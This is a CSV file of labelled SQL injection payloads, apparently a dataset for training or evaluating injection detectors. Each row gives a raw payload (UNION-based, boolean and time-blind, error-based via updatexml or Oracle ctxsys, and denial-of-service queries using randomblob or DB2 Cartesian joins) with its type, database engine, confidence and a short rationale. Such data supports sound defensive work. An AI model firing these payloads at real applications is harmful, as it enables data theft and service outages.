id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21544,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21545,"-5652%' ) union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",union_based,generic,0.90,UNION ALL SELECT structure indicates data exfiltration via column alignment,3
21546,1 ) where 6884 = 6884 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.65,CASE WHEN branches execute different SQL paths based on condition,2
21547,"1' or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.85,elt(condition, sleep()) branches MySQL time delay in true condition path,2
21548,"1"" ) ) as zgig where 5748 = 5748 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.95,ctxsys.drithsx.sn() Oracle error function; triggers indexing error with data,2
21549,1'|| ( select 'zwcp' where 3333 = 3333,boolean_blind,oracle,0.65,AND/OR equality comparison; payload controls boolean branch execution,2
21550,select ( case when ( 8916 = 1357 ) then 8916 else 8916* ( select 8916 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.65,CASE WHEN condition; branches execute different SQL paths based on comparison,2
21551,"-1303' union all select 4840,4840#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21552,"1%' ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Multiple sysibm.systables joins + count() is DB2 Cartesian DoS,2
21553,1' ) where 7541 = 7541,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21554,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'cfzp' like 'cfzp",error_based,mysql,0.95,updatexml() is MySQL XPath error; invalid replacement triggers error leak,2
21555,1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'vtoi' like 'vtoi,boolean_blind,mysql,0.80,RLIKE regex pattern matching; true/false branch based on regex match,2
21556,-8397' ) ) ) or 2171 = 4788,boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21557,"-8203"" ) union all select 6394,6394,6394,6394,6394--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
